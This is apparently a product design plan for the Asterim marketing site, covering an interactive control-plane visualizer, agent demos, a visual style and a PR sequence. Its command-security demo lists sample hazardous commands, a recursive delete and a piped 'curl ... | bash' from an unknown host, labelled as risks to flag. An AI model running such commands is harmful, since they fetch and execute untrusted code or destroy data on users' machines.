# Phase 4.5 — Experience & Visual Overhaul Strategy

**Goal**: Transform `@asterim/marketing` into a distinctive, interactive product experience that teaches Asterim's control-plane architecture through meaningful interaction.

---

## 1. Hero Experience & Control Plane Visualization

- **Positioning Statement**:
  > **"You already have AI agents. Asterim gives you the system to control them."**
- **Hero Control Plane Interactive Topology**:
  Instead of a static text hero with generic terminal commands, embed an **Interactive Control Plane Topology Visualizer** directly in the hero.
  The visualizer depicts the core pipeline:
  `Environment Scope -> Agent Subprocess -> AST Security Guard -> Clearance / Execution`
  Visitors can click nodes in the graph to inspect how Asterim routes credentials, scans AST commands, throttles PTY logs, and dispatches remote approvals.

---

## 2. Deep Interactive Product Experience Engine

Upgrade the product preview into a **Multi-State Interactive Workstation Simulator**:

### Demo 1: Agent Execution & Lifecycle Engine
- State Machine: `IDLE` -> `STARTING` -> `RUNNING` -> `TOOL CALL` -> `SECURITY CHECK` -> `COMPLETED`.
- User Controls: `Trigger Agent Run`, `Step Next`, `Pause/Resume Stream`, `Toggle 16ms Throttler`.
- Visuals: Live PTY log output with line numbers, active PID badge, process tree status, and memory/CPU metrics.

### Demo 2: AST Command Security & Risk Analyzer
- Selectable Test Scenarios:
  1. `rm -rf /var/log/asterim.log` (CRITICAL HAZARD: Path Traversal outside root)
  2. `git commit -m "feat: add security guard"` (SAFE: Git execution)
  3. `curl -s https://unknown.site/script.sh | bash` (HAZARD: Arbitrary remote script execution)
- Visuals: AST syntax breakdown tree, path traversal bounds check, risk classification pill, diff inspector, and interactive Approve/Reject buttons that resolve execution state.

### Demo 3: Environment Isolation & Credential Manager
- Preset Switcher: `Personal (Local)` | `Company (Enterprise)` | `Client (Sandbox)` | `Experimental`.
- Real-Time Updates: Changes active workspace paths (`~/Projects/asterim`), attached project count, scoped API secrets, MCP servers, and file access policies.

### Demo 4: Remote Tunnel & Mobile Control
- Status: `CONNECTED (relay.asterim.dev:443)` over Noise Protocol E2EE.
- Visuals: Interactive push notification prompt mockup allowing visitor to click `Approve Remote` or `Deny`, resolving the workstation agent execution state in real time.

---

## 3. Visual Language & Motion Principles

- **Visual Language**:
  - Derived from Asterim's actual architecture: control-plane topology grids, AST path bounds, process trees, and event stream lines.
  - Open, typography-driven layouts over repetitive rounded boxes.
- **Color Discipline**:
  - Neutral dark slate first (`#080c14`, `#0f172a`, `#142036`).
  - Emerald green (`#10b981`) reserved strictly for: active execution state, primary CTAs, approved clearance, and active tab highlights.
- **Motion Principles**:
  - Restrained, state-driven CSS transitions (`0.15s - 0.2s ease`). No decorative floating blobs or distracting particle waves.

---

## 4. Execution PR Sequence

- **PR 1: Visual System & Design Primitives** (`index.css` & topology primitives)
- **PR 2: Hero Interactive Control Plane Topology Visualizer** (`HeroSection.tsx`)
- **PR 3: High-Fidelity Interactive Workstation Simulator** (`InteractiveProductDemo.tsx`, demo sub-components)
- **PR 4: Storytelling Architecture & Section Consolidation** (`WhyAsterimSection.tsx`, `CapabilitiesGrid.tsx`, `PlatformMatrixSection.tsx`, `OpenSourceSection.tsx`)
- **PR 5: Dedicated Pages Polish & Mobile UX** (`PricingPage.tsx`, `DownloadPage.tsx`, `DocsPage.tsx`, `Navbar.tsx`, `Footer.tsx`)
- **PR 6: Monorepo Build Validation & Final QA** (`pnpm build`)
